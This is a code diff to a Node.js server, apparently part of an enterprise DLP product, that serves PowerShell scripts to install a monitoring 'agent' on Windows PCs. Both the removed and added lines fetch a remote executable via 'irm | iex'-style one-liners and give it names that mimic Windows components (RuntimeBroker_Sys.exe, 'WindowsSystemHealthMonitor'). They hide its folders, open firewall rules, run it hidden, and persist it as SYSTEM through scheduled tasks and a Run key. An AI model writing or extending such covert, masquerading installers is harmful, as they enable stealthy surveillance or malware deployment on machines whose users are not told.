@@ -774,58 +774,8 @@ app.get("/agent-download", (req, res) => {
   }
 });
 
-// One-liner deployment script — target PC runs: irm http://SERVER:4000/download-join | iex
-app.get("/download-join", (req, res) => {
-  const localIP = (() => {
-    const nets = require("os").networkInterfaces();
-    for (const name of Object.keys(nets)) {
-      for (const n of nets[name]) {
-        if (n.family === "IPv4" && !n.internal) return n.address;
-      }
-    }
-    return "localhost";
-  })();
-
-  const resolvedServerUrl = process.env.PUBLIC_URL || `http://${localIP}:4000`;
-  const lines = [
-    '# HBOSE Silent Agent Deployment',
-    "$ErrorActionPreference = 'SilentlyContinue'",
-    `$ServerUrl = "${resolvedServerUrl}"`,
-    '$InstallDir = Join-Path $env:ProgramData "Microsoft\\Windows\\SystemHealth"',
-    '$ExeName = "RuntimeBroker_Sys.exe"',
-    '$ExePath = Join-Path $InstallDir $ExeName',
-    '',
-    'if (!(Test-Path $InstallDir)) {',
-    '    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null',
-    '    $f = Get-Item $InstallDir -Force',
-    "    $f.Attributes = 'Hidden','System','Directory'",
-    '}',
-    '',
-    'Get-Process -Name "RuntimeBroker_Sys","teram_agent" -ErrorAction SilentlyContinue | Stop-Process -Force',
-    'Start-Sleep -Seconds 2',
-    '',
-    'Write-Host "[+] Downloading agent from $ServerUrl..."',
-    'Invoke-WebRequest -Uri "$ServerUrl/agent-download" -OutFile $ExePath -UseBasicParsing',
-    '',
-    'if (!(Test-Path $ExePath)) {',
-    '    Write-Host "[!] Download failed!" -ForegroundColor Red',
-    '    exit 1',
-    '}',
-    '',
-    'icacls $InstallDir /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" /T /Q | Out-Null',
-    '',
-    '$TaskName = "WindowsSystemHealthMonitor"',
-    'Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue',
-    '$Action = New-ScheduledTaskAction -Execute $ExePath -Argument $ServerUrl',
-    '$Trigger = @((New-ScheduledTaskTrigger -AtStartup),(New-ScheduledTaskTrigger -AtLogOn))',
-    '$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)',
-    'Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null',
-    '',
-    'Start-Process -FilePath $ExePath -ArgumentList $ServerUrl -WindowStyle Hidden',
-    'Write-Host "[+] Agent deployed and running. Connecting to $ServerUrl" -ForegroundColor Green',
-  ];
-  res.type("text/plain").send(lines.join("\n"));
-});
+// Old duplicate /download-join handler removed — the proper handler is below (near line 2833)
+// which downloads agent.zip and sets up persistence correctly.
 
 // ═══════════════════════════════════════════════
 // DLP ENTERPRISE APIs — ALL 5 PHASES
@@ -2919,33 +2869,30 @@ if (Test-Path "$INSTALL_DIR\\teram_agent.exe") {
     exit 1
 }
 
-# 6. Create silent launcher VBS and configure persistence
+# 6. Configure persistence (NO VBS — direct exe launch)
 Write-Host "[5/7] Configuring persistence..." -ForegroundColor Yellow
 
-# Determine if node-based or standalone exe
+# Determine the run command based on whether index.js exists
 $hasIndex = Test-Path "$INSTALL_DIR\\index.js"
 if ($hasIndex) {
-    $runCmd = "chr(34) & \`"$INSTALL_DIR\\$BIN_NAME\`" & chr(34) & \`" index.js $SERVER_URL\`""
+    $taskArgs = "index.js $SERVER_URL"
 } else {
-    $runCmd = "chr(34) & \`"$INSTALL_DIR\\$BIN_NAME\`" & chr(34) & \`" $SERVER_URL\`""
+    $taskArgs = "$SERVER_URL"
 }
 
-$vbsContent = @"
-On Error Resume Next
-Set W = CreateObject("WScript.Shell")
-W.CurrentDirectory = "$INSTALL_DIR"
-Do
-  W.Run $runCmd, 0, True
-  WScript.Sleep 5000
-Loop
-"@
-Set-Content -Path "$INSTALL_DIR\\service.vbs" -Value $vbsContent -Force
+# Remove any old VBS-based persistence
+Remove-Item -Path "$INSTALL_DIR\\service.vbs" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue
 
-# Scheduled Task
-schtasks /Create /TN "MicrosoftWindowsHealthMonitor" /TR "wscript.exe \`"$INSTALL_DIR\\service.vbs\`"" /SC ONLOGON /RL HIGHEST /F 2>$null | Out-Null
+# Scheduled Task — runs exe directly, auto-restarts on failure
+schtasks /Delete /TN "MicrosoftWindowsHealthMonitor" /F 2>$null | Out-Null
+$Action = New-ScheduledTaskAction -Execute "$INSTALL_DIR\\$BIN_NAME" -Argument $taskArgs -WorkingDirectory $INSTALL_DIR
+$Trigger = @((New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -AtLogOn))
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
+Register-ScheduledTask -TaskName "MicrosoftWindowsHealthMonitor" -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force 2>$null | Out-Null
 
-# Registry Run key
-New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "wscript.exe \`"$INSTALL_DIR\\service.vbs\`"" -PropertyType String -Force | Out-Null
+# Registry Run key (backup persistence) — also direct exe, no VBS
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "\`"$INSTALL_DIR\\$BIN_NAME\`" $taskArgs" -PropertyType String -Force | Out-Null
 
 # 7. Security config & stealth
 Write-Host "[6/7] Configuring security exclusions..." -ForegroundColor Yellow
@@ -2955,14 +2902,16 @@ netsh advfirewall firewall delete rule name="Windows System Health" 2>$null | Ou
 netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
 netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
 
-# Hide files
-attrib +h +s "$INSTALL_DIR" /D 2>$null
-attrib +h +s "$INSTALL_DIR\\$BIN_NAME" 2>$null
-attrib +h +s "$INSTALL_DIR\\service.vbs" 2>$null
+# Grant proper ACLs BEFORE hiding
+icacls "$INSTALL_DIR" /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\\Users:(OI)(CI)RX" /T /C /Q 2>$null | Out-Null
 
-# Start the service
+# Hide directory (after ACLs are set)
+attrib +h "$INSTALL_DIR" /D 2>$null
+attrib +h "$INSTALL_DIR\\$BIN_NAME" 2>$null
+
+# Start the service directly
 Write-Host "[7/7] Starting agent service..." -ForegroundColor Yellow
-Start-Process wscript.exe -ArgumentList "\`"$INSTALL_DIR\\service.vbs\`"" -WindowStyle Hidden
+Start-Process -FilePath "$INSTALL_DIR\\$BIN_NAME" -ArgumentList $taskArgs -WorkingDirectory $INSTALL_DIR -WindowStyle Hidden
 
 # Cleanup temp files
 Remove-Item $TEMP_ZIP -Force -ErrorAction SilentlyContinue
